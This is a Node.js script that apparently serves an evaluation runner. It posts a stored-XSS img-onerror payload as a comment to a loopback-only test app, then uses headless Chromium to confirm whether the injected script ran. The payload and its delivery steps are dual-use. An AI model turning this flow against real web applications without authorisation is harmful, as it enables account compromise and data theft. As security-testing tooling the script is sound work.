#!/usr/bin/env node
// Browser-backed stored-XSS repro for the eval runner (loopback only).
// Logs in, posts a comment carrying a unique onerror payload, loads the page
// that renders comments, and reports whether the script actually executed
// (window.__xss === the nonce). Execution in a real browser is what makes a
// stored-XSS finding EXPLOITED rather than merely "markup reflected".
//
// Usage: node browser_probe.mjs --base http://127.0.0.1:3101 \
//   --login /login --comments-path /comments --post-path /api/comments \
//   --user alice --pass alice-fixture-pw
import { createRequire } from 'node:module';
import process from 'node:process';

function arg(n, d) { const i = process.argv.indexOf(`--${n}`); return i !== -1 ? process.argv[i + 1] : d; }
const base = arg('base');
const loginPath = arg('login', '/login');
const postPath = arg('post-path', '/api/comments');
const commentsPath = arg('comments-path', '/comments');
const user = arg('user'), pass = arg('pass');
if (!base || !user) { console.error('browser_probe: --base and --user required'); process.exit(2); }
try { const h = new URL(base).hostname; if (!['localhost', '127.0.0.1', '::1', '0.0.0.0'].includes(h)) { console.error('refusing non-loopback'); process.exit(2); } }
catch { process.exit(2); }

const require = createRequire(process.env.RG_PLAYWRIGHT_BASE ? `${process.env.RG_PLAYWRIGHT_BASE}/package.json` : import.meta.url);
let chromium; try { ({ chromium } = require('playwright')); } catch (e) { console.error('no playwright: ' + e.message); process.exit(3); }

const nonce = 'XSS' + Math.floor(Math.random() * 1e9);
const payload = `<img src=x onerror="window.__xss='${nonce}'">`;

// get a token (JSON login)
const loginResp = await fetch(base + loginPath, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ username: user, password: pass }),
}).catch(() => null);
let token = null;
if (loginResp && loginResp.ok) { try { token = (await loginResp.json()).token; } catch {} }

// post the stored payload
const postResp = await fetch(base + postPath, {
  method: 'POST',
  headers: { 'content-type': 'application/json', ...(token ? { authorization: 'Bearer ' + token } : {}) },
  body: JSON.stringify({ body: payload }),
}).catch(() => null);
const posted = !!(postResp && postResp.status < 500);

const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
let executed = false, reflected = false, html = '';
try {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(base + commentsPath, { waitUntil: 'networkidle', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(600);
  executed = (await page.evaluate((n) => window.__xss === n, nonce).catch(() => false));
  html = (await page.content().catch(() => '')) || '';
  reflected = html.includes('onerror=') && html.includes(nonce);
} finally { await browser.close(); }

console.log(JSON.stringify({ posted, executed, reflected, nonce, payload }));
process.exit(0);
